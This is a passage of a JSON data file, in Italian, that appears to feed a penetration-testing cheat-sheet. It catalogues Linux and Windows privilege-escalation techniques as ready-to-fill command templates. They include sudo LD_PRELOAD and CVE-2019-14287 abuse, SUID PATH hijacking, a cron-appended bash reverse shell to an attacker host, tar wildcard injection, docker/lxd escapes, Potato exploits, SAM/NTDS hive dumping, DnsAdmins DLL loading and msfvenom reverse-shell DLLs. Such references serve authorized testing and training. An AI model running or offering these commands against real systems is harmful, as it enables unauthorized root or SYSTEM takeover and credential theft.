        "template": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "description": "Esegue in memoria senza scrivere su disco."
      },
      {
        "id": "local",
        "label": "Da file",
        "template": "./linpeas.sh | tee linpeas_output.txt",
        "description": "Trasferimento ed esecuzione con salvataggio dell'output tramite `tee`."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Linux Privesc",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
      }
    ]
  },
  {
    "id": "linux-exploit-suggester",
    "name": "linux-exploit-suggester",
    "category": "privesc-linux",
    "subcategory": "auto-enum",
    "group": "Linux",
    "description": "Confronta la versione del kernel e dei pacchetti installati con un database di exploit noti, producendo una lista ordinata per probabilità di successo. I risultati vanno sempre incrociati con l'output di LinPEAS e verificati, perché molti sono falsi positivi legati a backport di sicurezza che correggono la falla senza cambiare il numero di versione.",
    "note": "# Attenzione\nSi basa sulla versione del kernel e dà molti falsi positivi. Un kernel exploit sbagliato manda la macchina in panic: è l’ultima risorsa, dopo aver escluso sudo, SUID, cron e capabilities.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "les",
      "kernel",
      "enum"
    ],
    "template": "./linux-exploit-suggester.sh",
    "params": []
  },
  {
    "id": "sudo-l",
    "name": "sudo -l — privilegi sudo",
    "category": "privesc-linux",
    "subcategory": "sudo",
    "group": "Linux",
    "description": "Mostra quali comandi l'utente corrente può eseguire via `sudo`. Per ogni binario marcato `NOPASSWD` l'escape corrispondente si cerca su GTFOBins.",
    "note": "# Prossimo passo\nPer ogni voce NOPASSWD cerca il binario su GTFOBins. Se compare env_keep+=LD_PRELOAD o LD_LIBRARY_PATH usa la variante LD_PRELOAD; (ALL) senza restrizioni significa root diretto con sudo su.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sudo",
      "gtfobins"
    ],
    "template": "sudo -l",
    "params": [],
    "refs": [
      {
        "label": "GTFOBins",
        "url": "https://gtfobins.github.io/"
      }
    ]
  },
  {
    "id": "sudo-ldpreload",
    "name": "sudo — abuso LD_PRELOAD",
    "category": "privesc-linux",
    "subcategory": "sudo",
    "group": "Linux",
    "description": "Se `sudo -l` mostra `env_keep+=LD_PRELOAD`, carica una libreria che dà shell root. Compila `evil.c` con `void _init(){setuid(0);system(\"/bin/bash\");}` (`gcc -fPIC -shared -o evil.so evil.c -nostartfiles`).",
    "note": "# Prerequisiti\nFunziona solo se sudo -l mostra env_keep+=LD_PRELOAD. Compili una libreria con la funzione _init() che lancia la shell e la carichi via sudo su un binario permesso.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sudo",
      "ld_preload"
    ],
    "template": "sudo LD_PRELOAD=/tmp/evil.so <binary>",
    "params": [
      {
        "key": "binary",
        "label": "Binario sudo",
        "placeholder": "apache2"
      }
    ]
  },
  {
    "id": "sudo-cve2019",
    "name": "sudo CVE-2019-14287",
    "category": "privesc-linux",
    "subcategory": "sudo",
    "group": "Linux",
    "description": "Su `sudo < 1.8.28` con una regola tipo `(ALL,!root)`, l’UID `-1` viene risolto come `0`, shell root.",
    "note": "# Prerequisiti\nColpisce sudo precedente alla 1.8.28 con una regola tipo (ALL, !root): sudo -u#-1 bypassa il blocco su root. Controlla la versione con sudo --version.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sudo",
      "cve-2019-14287"
    ],
    "template": "sudo -u#-1 /bin/bash",
    "params": []
  },
  {
    "id": "find-suid",
    "name": "SUID/SGID — trova e abusa",
    "category": "privesc-linux",
    "subcategory": "suid-sgid",
    "group": "Linux",
    "description": "Trova i binari `SUID` (eseguono come owner, spesso root). Per ognuno controlla GTFOBins; se è custom analizzalo per command injection o path hijack.",
    "note": "# Prossimo passo\nConfronta i binari trovati con GTFOBins. I binari custom o non standard vanno analizzati a parte (strings, ltrace): spesso invocano altri eseguibili senza path assoluto, sfruttabili via PATH hijack.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "suid",
      "sgid",
      "gtfobins"
    ],
    "template": "find / -perm -4000 -type f 2>/dev/null",
    "params": [
      {
        "key": "command",
        "label": "Comando hijackato",
        "placeholder": "service"
      },
      {
        "key": "binary",
        "label": "Binario SUID",
        "placeholder": "/usr/bin/find"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Trova SUID",
        "template": "find / -perm -4000 -type f 2>/dev/null",
        "description": "Binari `SUID`. Per `SGID` usa `-perm -2000`."
      },
      {
        "id": "pathhijack",
        "label": "PATH hijack",
        "template": "echo '/bin/bash' > /tmp/<command>; chmod +x /tmp/<command>; export PATH=/tmp:$PATH",
        "description": "Se il SUID chiama un comando senza path assoluto: metti un finto `<command>` in testa al `PATH`."
      },
      {
        "id": "soinject",
        "label": "SO injection",
        "template": "strace <binary> 2>&1 | grep \"No such file\"",
        "description": "Quando il binario SUID carica una `.so` mancante, quella libreria va creata con il payload al suo interno."
      }
    ]
  },
  {
    "id": "getcap-all",
    "name": "getcap — capabilities",
    "category": "privesc-linux",
    "subcategory": "capabilities",
    "group": "Linux",
    "description": "Elenca i file con capabilities e i poteri speciali che ne derivano. Da controllare in particolare:\n- `cap_setuid` = consente di impostare UID 0 e diventare root\n- `cap_dac_read_search` = consente la lettura di qualsiasi file bypassando i permessi, per esempio `/etc/shadow`\n- `cap_net_bind_service` = consente il bind su porte inferiori a 1024",
    "note": "# Cosa osservare\nLe capabilities più sfruttabili: cap_setuid (shell root diretta), cap_dac_read_search (leggi qualsiasi file, es. shadow), cap_sys_admin. Il suffisso =ep indica capability piena sul binario.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "getcap",
      "capabilities"
    ],
    "template": "getcap -r / 2>/dev/null",
    "params": []
  },
  {
    "id": "cap-setuid-python",
    "name": "cap_setuid, shell root",
    "category": "privesc-linux",
    "subcategory": "capabilities",
    "group": "Linux",
    "description": "Un binario con `cap_setuid+ep`, per esempio `python3`, permette di impostare UID 0 e aprire una shell di root.",
    "note": "# Prerequisiti\nServe un interprete (python, perl) con cap_setuid+ep. Con os.setuid(0) e poi la shell diventi root senza bisogno di un binario SUID classico.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "cap_setuid",
      "python"
    ],
    "template": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "params": []
  },
  {
    "id": "cron-discover",
    "name": "Cron — scopri e abusa",
    "category": "privesc-linux",
    "subcategory": "cron-tasks",
    "group": "Linux",
    "description": "Elenca cron job e timer. Un job che gira come root ed esegue uno script scrivibile, o che usa una wildcard, apre all'iniezione di comandi.",
    "note": "# Prossimo passo\nCerca cron job che eseguono script scrivibili da te, o che usano wildcard (es. tar *) o PATH relativo. pspy mostra i job in esecuzione senza dover leggere i file di cron.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "cron",
      "wildcard"
    ],
    "template": "cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/; systemctl list-timers",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Scopri",
        "template": "cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/; systemctl list-timers",
        "description": "Cron job di sistema e timer systemd."
      },
      {
        "id": "writable",
        "label": "Script scrivibile",
        "template": "echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/script.sh",
        "description": "Appendi una reverse shell allo script eseguito dal cron root."
      },
      {
        "id": "wildcard",
        "label": "Wildcard (tar)",
        "template": "echo \"\" > \"--checkpoint=1\"; echo \"\" > \"--checkpoint-action=exec=sh shell.sh\"",
        "description": "Se il job fa `tar *`: crea file il cui nome è un’opzione `tar`, esecuzione."
      }
    ]
  },
  {
    "id": "kernel-linux",
    "name": "Kernel exploit — Linux",
    "category": "privesc-linux",
    "subcategory": "kernel",
    "group": "Linux",
    "description": "Ultima risorsa (può far crashare l'host). CVE comuni:\n- PwnKit (`CVE-2021-4034`) = polkit, quasi universale\n- DirtyPipe (`CVE-2022-0847`) = kernel 5.8-5.16.11\n- DirtyCow (`CVE-2016-5195`) = kernel vecchi",
    "note": "# Attenzione\nUltima risorsa: un exploit kernel sbagliato causa un kernel panic. Identifica versione (uname -r) e CVE note (DirtyPipe, DirtyCow, PwnKit). PwnKit (pkexec) e Baron Samedit sono più affidabili del kernel puro.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "kernel",
      "pwnkit",
      "dirtypipe"
    ],
    "template": "uname -a; searchsploit linux kernel <version>",
    "params": [
      {
        "key": "version",
        "label": "Versione kernel",
        "placeholder": "5.15.0"
      }
    ]
  },
  {
    "id": "docker-group",
    "name": "Gruppo docker / lxd, root",
    "category": "privesc-linux",
    "subcategory": "container-escape",
    "group": "Linux",
    "description": "L'appartenenza al gruppo `docker` o `lxd` consente di montare il filesystem dell'host dentro un container privilegiato e di ottenere root.",
    "note": "# Prerequisiti\nAppartenere al gruppo docker o lxd equivale a root: monti il filesystem dell’host dentro un container privilegiato e ne esci con accesso completo. Verifica con id.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "docker",
      "lxd",
      "escape"
    ],
    "template": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "docker",
        "template": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "description": "Monta la `/` dell'host nel container ed esegue `chroot`."
      },
      {
        "id": "lxd",
        "label": "lxd",
        "template": "lxc init alpine privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc /bin/sh",
        "description": "Container privilegiato con `/` host montato in `/mnt/root`."
      }
    ]
  },
  {
    "id": "nfs-rootsquash",
    "name": "NFS no_root_squash, root",
    "category": "privesc-linux",
    "subcategory": "container-escape",
    "group": "Host Escape",
    "description": "Se un export in `/etc/exports` ha `no_root_squash`, monta la share da attacker (come root), crea una bash `SUID`, poi eseguila sul target.",
    "note": "# Prerequisiti\nFunziona se un export NFS ha no_root_squash (vedi showmount -e o /etc/exports). Da root sulla tua macchina monti la share e ci lasci un binario SUID root: sul target quel binario gira come root.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nfs",
      "no_root_squash",
      "suid"
    ],
    "template": "sudo mount -t nfs <ip>:<share> /mnt/nfs; sudo cp /bin/bash /mnt/nfs/bash; sudo chmod +s /mnt/nfs/bash",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "/home/user"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Crea SUID (attacker)",
        "template": "sudo mount -t nfs <ip>:<share> /mnt/nfs; sudo cp /bin/bash /mnt/nfs/bash; sudo chmod +s /mnt/nfs/bash",
        "description": "Monti come root e pianti una bash `SUID` nella share."
      },
      {
        "id": "exec",
        "label": "Esegui (target)",
        "template": "/mnt/nfs/bash -p",
        "description": "Dal target: la bash `SUID` con `-p` mantiene l’UID 0, root."
      }
    ]
  },
  {
    "id": "winpeas",
    "name": "WinPEAS — enum privesc",
    "category": "privesc-windows",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Enumerazione automatica per Windows, equivalente di LinPEAS: setaccia servizi, permessi deboli, credenziali salvate, privilegi del token e AlwaysInstallElevated, evidenziando in rosso i vettori più promettenti. Su un target con EDR attivo il binario viene spesso segnalato, e conviene ripiegare su Seatbelt o sui comandi manuali.",
    "note": "# Cosa osservare\nEvidenzia in rosso i vettori probabili: privilegi del token, servizi mal configurati, credenziali salvate, AlwaysInstallElevated. Esegui la build giusta (x64/x86) e conferma a mano.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "winpeas",
      "peass",
      "enum"
    ],
    "template": ".\\winpeas.exe",
    "params": []
  },
  {
    "id": "seatbelt",
    "name": "Seatbelt — security checks",
    "category": "privesc-windows",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Raccoglie decine di controlli di sicurezza sull'host Windows in un'unica passata: privilegi del token, stato UAC, configurazione dei servizi, credenziali salvate, cronologia dei browser e altro. Rispetto a WinPEAS l'output è organizzato per categoria, più leggibile quando serve solo un'area. `-group=all` esegue ogni check disponibile.",
    "note": "# Cosa osservare\nRaccoglie decine di check di sicurezza (UAC, LAPS, credenziali salvate, sessioni, AutoLogon). Dà il quadro completo: incrocialo con WinPEAS per i vettori davvero sfruttabili.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "seatbelt",
      "enum"
    ],
    "template": ".\\Seatbelt.exe -group=all",
    "params": []
  },
  {
    "id": "powerup",
    "name": "PowerUp / SharpUp — misconfig",
    "category": "privesc-windows",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Cerca le misconfigurazioni di Windows che portano a escalation locale: servizi con permessi deboli, binari modificabili, unquoted service path e AlwaysInstallElevated. Per ogni problema trovato indica già la funzione di abuso da richiamare. Gira in memoria via PowerShell, il che riduce le tracce su disco ma resta rilevabile dai controlli su AMSI.",
    "note": "# Prossimo passo\nInvoke-AllChecks elenca servizi modificabili, unquoted path e registry deboli, e include le funzioni per abusarli. SharpUp è la versione C# per ambienti senza PowerShell.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "powerup",
      "sharpup",
      "enum"
    ],
    "template": "Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "PowerUp",
        "template": "Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
        "description": "PowerShell: `Invoke-AllChecks` lancia tutti i controlli."
      },
      {
        "id": "sharpup",
        "label": "SharpUp",
        "template": ".\\SharpUp.exe audit",
        "description": "Versione C# compilata (.NET), più stealth di PowerShell."
      }
    ]
  },
  {
    "id": "wes",
    "name": "Windows Exploit Suggester",
    "category": "privesc-windows",
    "subcategory": "auto-enum",
    "group": "Windows",
    "description": "Windows Exploit Suggester confronta l'output di `systeminfo`, quindi versione, build e hotfix installati, con il database dei bollettini Microsoft per elencare le vulnerabilità kernel non corrette. Gira in locale sull'output salvato, senza toccare il target. La lista va filtrata tenendo solo gli exploit con codice pubblico affidabile, perché molti risultati sono soltanto teorici.",
    "note": "# Prerequisiti\nUsa l’output di systeminfo (fase Post-Exploitation): confronta le hotfix installate col DB MSRC e segnala gli exploit kernel mancanti. Preferiscilo al kernel exploit cieco.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "wes",
      "kernel",
      "enum"
    ],
    "template": "systeminfo > systeminfo.txt   # poi: python3 wes.py systeminfo.txt",
    "params": []
  },
  {
    "id": "whoami-priv",
    "name": "whoami /priv",
    "category": "privesc-windows",
    "subcategory": "token-priv",
    "group": "Windows",
    "description": "Mostra i privilegi del token. I più sfruttabili: `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`.",
    "note": "# Cosa osservare\nSeImpersonate e SeAssignPrimaryToken abilitano i Potato verso SYSTEM; SeBackup/SeRestore leggono SAM e NTDS; SeDebug la memoria di LSASS; SeLoadDriver carica driver vulnerabili.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "token",
      "privileges"
    ],
    "template": "whoami /priv",
    "params": []
  },
  {
    "id": "printspoofer",
    "name": "SeImpersonate, SYSTEM (Potato)",
    "category": "privesc-windows",
    "subcategory": "token-priv",
    "group": "Windows",
    "description": "`SeImpersonatePrivilege`, tipico di service account, IIS e MSSQL, consente di abusare di un named pipe per ottenere SYSTEM. Il tool si sceglie in base alla versione di Windows.",
    "note": "# Prerequisiti\nServe SeImpersonatePrivilege (tipico di account di servizio, IIS, MSSQL). PrintSpoofer sfrutta lo spooler; se è patchato usa GodPotato o JuicyPotatoNG. Risultato: shell SYSTEM.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "printspoofer",
      "godpotato",
      "seimpersonate"
    ],
    "template": ".\\PrintSpoofer64.exe -i -c powershell",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "PrintSpoofer",
        "template": ".\\PrintSpoofer64.exe -i -c powershell",
        "description": "Windows 10 e 11, Server 2016-2022. È la scelta corretta proprio dove JuicyPotato non funziona più, ciòè da Server 2019 e Windows 10 1809 in poi. `-i` apre una shell interattiva."
      },
      {
        "id": "godpotato",
        "label": "GodPotato",
        "template": ".\\GodPotato.exe -cmd \"C:\\Temp\\shell.exe\"",
        "description": "Funziona su molte versioni (Server 2012-2022)."
      },
      {
        "id": "juicyng",
        "label": "JuicyPotatoNG",
        "template": ".\\JuicyPotatoNG.exe -t * -p C:\\Temp\\shell.exe",
        "description": "Alternativa se le altre falliscono."
      }
    ]
  },
  {
    "id": "sebackup",
    "name": "SeBackup / SeTakeOwnership",
    "category": "privesc-windows",
    "subcategory": "token-priv",
    "group": "Windows",
    "description": "`SeBackupPrivilege` consente la copia di file protetti come SAM, SYSTEM e NTDS, mentre `SeTakeOwnershipPrivilege` consente di prendere possesso di un file e di assegnarsi i permessi.",
    "note": "# Prossimo passo\nCon SeBackupPrivilege copi gli hive SAM e SYSTEM, o il file NTDS.dit su un DC, e li dai a secretsdump offline per gli hash. Non ti rende SYSTEM ma ti consegna le credenziali.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sebackup",
      "setakeownership"
    ],
    "template": "robocopy /B C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SeBackup (robocopy)",
        "template": "robocopy /B C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM",
        "description": "Copia SAM e SYSTEM bypassando l’ACL (`/B` backup mode), poi `secretsdump LOCAL`."
      },
      {
        "id": "takeown",
        "label": "SeTakeOwnership",
        "template": "takeown /f C:\\Windows\\System32\\config\\SAM & icacls C:\\Windows\\System32\\config\\SAM /grant <user>:F",
        "description": "Assegna la proprietà del file all'account corrente, che poi si concede il Full Control."
      }
    ]
  },
  {
    "id": "dnsadmins-dll",
    "name": "DnsAdmins — DLL, SYSTEM",
    "category": "privesc-windows",
    "subcategory": "priv-groups",
    "group": "Windows",
    "description": "Membro di `DnsAdmins`: fai caricare al servizio DNS (che gira come SYSTEM) una DLL malevola via UNC, poi riavvia il servizio.",
    "note": "# Prerequisiti\nMembro di DnsAdmins: carichi una DLL malevola nel servizio DNS (dnscmd /config /serverlevelplugindll) che gira come SYSTEM, di norma su un Domain Controller. Serve poter riavviare il servizio DNS.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "dnsadmins",
      "dll",
      "dns"
    ],
    "template": "dnscmd <dc> /config /serverlevelplugindll \\\\<lhost>\\share\\evil.dll",
    "params": [
      {
        "key": "dc",
        "label": "DC",
        "ctx": "ip",
        "placeholder": "dc01"
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Carica DLL",
        "template": "dnscmd <dc> /config /serverlevelplugindll \\\\<lhost>\\share\\evil.dll",
        "description": "Registra la DLL (ospitala su una share SMB)."
      },
      {
        "id": "restart",
        "label": "Riavvia DNS",
        "template": "sc.exe \\\\<dc> stop dns & sc.exe \\\\<dc> start dns",
        "description": "Riavvia il servizio DNS per caricare la DLL."
      }
    ]
  },
  {
    "id": "backup-operators",
    "name": "Backup Operators — dump hive & NTDS",
    "category": "privesc-windows",
    "subcategory": "priv-groups",
    "group": "Windows",
    "description": "Il gruppo Backup Operators ha il diritto di backup (SeBackupPrivilege), che permette di leggere qualunque file ignorando le ACL. Si usano reg save per gli hive su un membro o diskshadow per copiare NTDS.dit su un Domain Controller.",
    "note": "# Prossimo passo\nPorta SAM+SYSTEM (o NTDS.dit+SYSTEM) offline e passa a secretsdump per estrarre gli hash.\n# diskshadow su DC\nIl file script contiene: set context persistent nowriters / add volume C: alias z / create / expose %z% x: / e poi copi x:\\Windows\\NTDS\\ntds.dit.\n# Errori comuni\nreg save va eseguito da un processo con il privilegio attivo: con Backup Operators apri una shell e verifica con whoami /priv che SeBackupPrivilege sia presente.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "backup-operators",
      "sam"
    ],
    "template": "# salva gli hive protetti sfruttando il diritto di backup\nreg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "reg save (hive)",
        "template": "# salva gli hive protetti sfruttando il diritto di backup\nreg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
        "description": "Dump di SAM e SYSTEM su una macchina membro, poi secretsdump offline."
      },
      {
        "id": "ntds",
        "label": "diskshadow NTDS (DC)",
        "template": "# su un Domain Controller: copia NTDS.dit via Volume Shadow Copy\ndiskshadow /s shadow.txt\nrobocopy /B z:\\Windows\\NTDS C:\\Temp ntds.dit",
        "description": "Su un DC copia NTDS.dit (serve anche SYSTEM) per il dump completo del dominio."
      }
    ]
  },
  {
    "id": "server-operators",
    "name": "Server Operators — abusa servizio",
    "category": "privesc-windows",
    "subcategory": "priv-groups",
    "group": "Windows",
    "description": "Il gruppo `Server Operators` può modificare i servizi: il binPath di un servizio, per esempio `AppReadiness`, viene ripuntato sul payload e il servizio riavviato.",
    "note": "# Prerequisiti\nMembro di Server Operators: riconfiguri un servizio di sistema (sc config) perché esegua il tuo binario come SYSTEM, poi sc start. Gruppo privilegiato tipico sui Domain Controller.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "server-operators",
      "service"
    ],
    "template": "sc.exe config <service> binPath= \"C:\\Temp\\shell.exe\" & sc.exe stop <service> & sc.exe start <service>",
    "params": [
      {
        "key": "service",
        "label": "Servizio",
        "placeholder": "AppReadiness"
      }
    ]
  },
  {
    "id": "unquoted-path",
    "name": "Servizi — unquoted path / perm deboli",
    "category": "privesc-windows",
    "subcategory": "vuln-services",
    "group": "Service Abuse",
    "description": "Tre classi di servizio sfruttabili: path non quotato con spazi, permessi deboli sulla config, binario scrivibile.",
    "note": "# Prossimo passo\nUn service path con spazi e senza virgolette fa cercare a Windows un eseguibile nelle cartelle intermedie. Se una è scrivibile ci piazzi il tuo binario. Verifica i permessi con icacls.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "unquoted-path",
      "service",
      "accesschk"
    ],
    "template": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\"",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Unquoted path",
        "template": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\"",
        "description": "Un path con spazi e non racchiuso fra virgolette, per esempio `C:\\Program Files\\My App\\svc.exe`, consente di collocare `C:\\Program.exe`."
      },
      {
        "id": "accesschk",
        "label": "Permessi deboli",
        "template": ".\\accesschk64.exe /accepteula -uwcqv \"Users\" *",
        "description": "Cerca servizi con `SERVICE_CHANGE_CONFIG`: poi `sc.exe config <svc> binPath=...`."
      },
      {
        "id": "writable",
        "label": "Binario scrivibile",
        "template": "icacls \"C:\\path\\to\\service.exe\"",
        "description": "Un permesso `(M)` o `(F)` sull'eseguibile consente di sovrascriverlo con il payload."
      }
    ]
  },
  {
    "id": "win-service-perms",
    "name": "Servizi Windows — permessi deboli",
    "category": "privesc-windows",
    "subcategory": "vuln-services",
    "group": "Service Abuse",
    "description": "Se un utente ha il diritto di modificare la configurazione di un servizio (SERVICE_CHANGE_CONFIG) o di scrivere sul suo eseguibile, può dirottare il servizio per eseguire un comando come l'account che lo avvia, di solito SYSTEM. `accesschk` trova i servizi vulnerabili, `sc config` ne riscrive il binPath e il riavvio del servizio scatena l'esecuzione.",
    "note": "# Prossimo passo\nCon accesschk o PowerUp trovi servizi dove hai SERVICE_CHANGE_CONFIG o scrittura sul binario. Riconfiguri il binPath sul tuo payload e riavvii: gira come l’account del servizio, spesso SYSTEM.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "service",
      "accesschk",
      "privesc"
    ],
    "template": ".\\accesschk.exe /accepteula -uwcqv <user> *",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "svc",
        "label": "Servizio",
        "placeholder": "VulnSvc"
      }
    ],
    "variants": [
      {
        "id": "enum",
        "label": "Enum servizi scrivibili",
        "template": "# cerca i servizi su cui l'utente ha permessi di modifica\n.\\accesschk.exe /accepteula -uwcqv <user> *\n\n# stessa ricerca senza accesschk, solo con cmdlet nativi\nGet-CimInstance win32_service | ? {$_.StartName -like '*LocalSystem*'} | select Name,PathName",
        "description": "Elenca i servizi su cui l'utente ha permessi di scrittura (`SERVICE_CHANGE_CONFIG`/`WRITE_DAC`). Un servizio modificabile che gira come SYSTEM è la via diretta a SYSTEM."
      },
      {
        "id": "reconfig",
        "label": "Dirotta binPath",
        "template": "# riscrive il binario del servizio col tuo payload\nsc config <svc> binPath= \"C:\\Windows\\Temp\\rev.exe\"\n\n# ferma il servizio\nsc stop <svc>\n\n# lo riavvia: il payload parte con l'account del servizio\nsc start <svc>",
        "description": "Riscrive l'eseguibile del servizio con il proprio payload, poi lo riavvia per eseguirlo come SYSTEM. Ripristina il binPath originale a fine attività."
      },
      {
        "id": "binexe",
        "label": "Sovrascrivi l'eseguibile",
        "template": "# quando hai permesso di scrittura sul .exe del servizio e non serve sc config\n\n# sovrascrive il binario del servizio col payload\ncopy /Y C:\\Windows\\Temp\\rev.exe \"C:\\Path\\To\\service.exe\"\n\n# riavvia il servizio per eseguirlo\nsc stop <svc> & sc start <svc>",
        "description": "Quando è l'eseguibile a essere scrivibile, lo si sostituisce direttamente. Il riavvio del servizio (o un reboot) esegue il payload come SYSTEM."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Windows services",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
      }
    ]
  },
  {
    "id": "win-dll-hijack",
    "name": "DLL Hijacking (Windows)",
    "category": "privesc-windows",
    "subcategory": "vuln-services",
    "group": "DLL Hijacking",
    "description": "Un servizio o un'applicazione privilegiata che cerca una DLL in una cartella scrivibile, o secondo un ordine di ricerca prevedibile, può caricare una DLL malevola. Con Procmon si individua la DLL 'NOT FOUND' in un path scrivibile, si genera una DLL con lo stesso nome e il caricamento la esegue con i privilegi del processo.",
    "note": "# Prerequisiti\nUn processo privilegiato cerca una DLL che non trova, in una cartella scrivibile del suo search order. Ci metti una DLL con lo stesso nome. Individua le DLL mancanti con Procmon (filtro NAME NOT FOUND).",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "dll",
      "hijacking",
      "privesc"
    ],
    "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <dll>.dll",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "443"
      },
      {
        "key": "dll",
        "label": "Nome DLL",
        "placeholder": "hijackme"
      }
    ],
    "variants": [
      {
        "id": "find",
        "label": "Trova DLL mancanti",
        "template": "# Procmon: filtro Result = NAME NOT FOUND, Path finisce con .dll, in una cartella scrivibile\n# check scrivibilità delle cartelle nel PATH:\nfor %A in (\"%PATH:;=\";\"%\") do @icacls %A 2>nul | findstr /i \"Everyone BUILTIN\\Users AUTORITA\"",
        "description": "Individua le DLL cercate e non trovate in cartelle su cui l'utente può scrivere. Le cartelle scrivibili nel PATH di sistema sono candidati classici."
      },
      {
        "id": "build",
        "label": "Genera & piazza la DLL",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <dll>.dll\n# copia la DLL col nome atteso nel path scrivibile, poi riavvia il servizio/app",
        "description": "Crea la DLL malevola col nome esatto atteso e la piazza nel path individuato. Al successivo avvio del processo privilegiato la DLL viene caricata ed eseguita."
      }
    ]
  },
  {
    "id": "win-autorun",
    "name": "Autorun / AlwaysInstallElevated recheck",
    "category": "privesc-windows",
    "subcategory": "vuln-services",
    "group": "Autorun & Registry",
    "description": "Windows esegue automaticamente programmi elencati in alcune chiavi di registro e cartelle di avvio. Se l'eseguibile puntato o la chiave stessa sono scrivibili da un utente non privilegiato, si sostituisce il binario per eseguire codice al login di un utente con più privilegi. Vanno controllati anche gli autorun di sistema, non solo quelli utente.",
    "note": "# Prossimo passo\nCerca gli autorun (chiavi Run del registro, cartelle Startup) che puntano a un binario scrivibile da te: lo sostituisci e scatta al prossimo logon di un utente privilegiato.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "autorun",
      "registry",
      "startup"
    ],
    "template": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "params": [],
    "variants": [
      {
